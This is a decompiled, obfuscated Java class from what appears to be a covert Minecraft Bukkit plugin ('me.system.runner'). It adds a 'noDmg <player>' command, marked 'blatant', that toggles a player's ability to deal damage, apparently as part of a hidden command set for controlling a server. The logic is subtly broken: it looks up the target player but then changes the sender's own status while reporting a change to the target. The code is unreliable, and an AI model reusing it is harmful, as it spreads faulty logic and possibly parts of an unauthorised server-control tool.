/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class NodmgCommand
extends Command {
    @Override
    public void execute(Core llIIlIIlIIIllIl, String llIIlIIlIIlIIII, String[] llIIlIIlIIIllll, Player llIIlIIlIIIlllI) {
        if (llIIlIIlIIIllll.length <= 1) {
            llIIlIIlIIIlllI.sendMessage(Settings.USAGE("noDmg <player>"));
        } else {
            Player llIIlIIlIIlIIll = Bukkit.getServer().getPlayer(llIIlIIlIIIllll[1]);
            if (llIIlIIlIIlIIll == null) {
                llIIlIIlIIIlllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llIIlIIlIIIllll[1]).append(Settings.WHITE).append(" is not online."))));
            } else if (llIIlIIlIIIllIl.noDmg.contains(llIIlIIlIIIlllI.getName())) {
                llIIlIIlIIIlllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llIIlIIlIIIllll[1]).append(Settings.WHITE).append(" can now damage entities"))));
                llIIlIIlIIIllIl.noDmg.remove(llIIlIIlIIIlllI.getName());
            } else {
                llIIlIIlIIIlllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llIIlIIlIIIllll[1]).append(Settings.WHITE).append(" can no longer damage any entities."))));
                llIIlIIlIIIllIl.noDmg.add(llIIlIIlIIIlllI.getName());
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public NodmgCommand() {
        NodmgCommand llIIlIIlIIllIIl;
    }
}

